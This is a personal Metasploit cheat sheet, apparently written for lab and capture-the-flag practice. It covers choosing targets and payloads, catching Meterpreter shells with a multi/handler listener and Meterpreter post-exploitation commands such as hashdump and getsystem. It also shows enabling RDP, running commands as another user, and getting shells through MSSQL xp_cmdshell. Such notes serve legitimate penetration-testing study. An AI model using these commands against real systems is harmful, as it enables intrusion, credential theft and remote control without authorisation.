# Metasploit

This page is just basic stuff I forget all the time. There are other Metasploit tips in sections where it's relevant.

## Advanced options

Metasploit is so derp-easy that you can often exploit a machine by setting the remote IP in `RHOST` and hitting the pew-pew button.

But sometimes that doesn't work and you cry because you know you're just a lame script kiddie pretending to be a hacker. However, you can aspire to be a _decent_ script kiddie by knowing how to use more advanced options in Metasploit.

Exploits might not work because of an unusual configuration or path issue, which you can set with either `show options` or `show advanced`. The `advanced` section may let you set`verbose = true` to provide more information about why an exploit isn't working.

You might also need to set the correct target:

```text
show targets
set target [target number]
```

[MSO8-067](https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi) sometimes needs this because the module can't always identify the exact operating system version and language pack.

It's also important to pay attention to the default payload. Occasionally, you'll run into something weird like an Apache web server running on Windows, so the default Unix payload won't work.

Check and modify the payload:

```text
show payloads
set payload [whatever]
```

## Meterpreter

To catch shells using meterpreter:

```text
use exploit/multi/handler
set LHOST [attack machine]
set LPORT 443
run
```

If you're VPNed into a lab, pay attention to the IP address. I've noticed that the first time this module runs, it defaults to `eth0` and you have to restart it to use something like `tap0`.

### Basic commands

Frequently used commands, mostly to enumerate a victim machine:

```text
getuid      # get current user
sysinfo     # gets OS and hostname
execute     # execute a command
cd          # change directory
pwd         # print working directory
ls          # list files in current directory
mkdir       # make a directory
del         # delete a file
cat         # read the contents of a file
download    # download a file to your machine
hashdump    # get contents of password file
edit        # edit a file with vim
rm          # delete a file
rmdir       # remove directory
upload      # upload a file to the victim
ps          # list running processes
migrate     # move the active process to a designated PID
getpid      # get the current process ID (PID)
kill        # terminate a process by PID
ipconfig    # display network interfaces
portfwd     # forward a port on the victim to a remote service
route       # view or modify routing table
getprivs    # get as many privileges as possible
getsystem   # get Administrator
reboot      # reboot the victim
shutdown    # shut down the victim
reg         # interact with the victim's registry
```

### Sessions

Meterpreter is nice because it lets you maintain multiple shell sessions and use local exploits against them. For example, the [Rejetto exploit](https://www.exploit-db.com/exploits/39161/) always seems to fire a few times and with meterpreter, you can catch every shell session with a single listener.

To list active sessions:

```text
sessions -l
```

To enter a session:

```text
sessions -i [session number]
```

To enter a shell from a session \(not use meterpreter commands\):

```text
shell
```

To exit the shell and return to meterpreter, type `exit`.

## Useful exploits

I mostly use Metasploit on Windows machines because they still feel tricky to me. Below is a list of useful exploits for enumerating and running complex commands.

### Windows

Once you have a meterpreter shell, you can scan for local exploits and run them. Unlike remote exploits which target using IP addresses, local exploits run against a chosen shell session.

To access local exploits, you'll need to jump out of meterpreter using `background` and select one with the `use` command:

```text
meterpreter > background
use /exploit/windows/whatever
show options
[edit options as needed]
set SESSION [session number]
run
```

Check for exploits:

```text
meterpreter > run post/multi/recon/local_exploit_suggester
```

Get a remote desktop:

```text
meterpreter > run post/windows/manage/enable_rdp
```

Run a command as a different user:

```text
background
use post/windows/manage/run_as
[set username and password]
set CMDOUT true # output results of command
set CMD "type C:\Users\Administrator\Desktop\root.txt"
run
```

There are [manual ways to run commands as different user](https://stackoverflow.com/questions/12903629/how-do-i-run-a-program-from-command-prompt-as-a-different-user-and-as-an-admin) but I haven't tried them because I'm lazy.

### MSSQL

If you have credentials, you can use this module to get a shell:

```text
exploit/windows/mssql/mssql_payload
[set username and password]
run
```

It uses the `xp_cmdshell` stored procedure, [which isn't always enabled but can be](https://medium.com/pentestsec/hackthebox-tally-ctf-writeup-e132354d60e1). You could probably do the same exploit manually using a tool like [dbeaver](https://dbeaver.io/), but I haven't managed it yet. If you're attacking a very old version of MSSQL \(e.g. 2000\), you can connnect to it using [sqsh](https://medium.com/@jam3s/mssql-connectivity-with-sqsh-885393f142d4):

```text
sqsh -S [remote host]:[port] -U [username] -P [password]
```

You can then attempt to launch `xp_cmdshell` with the following syntax:

```text
xp_cmdshell 'date'
go
```

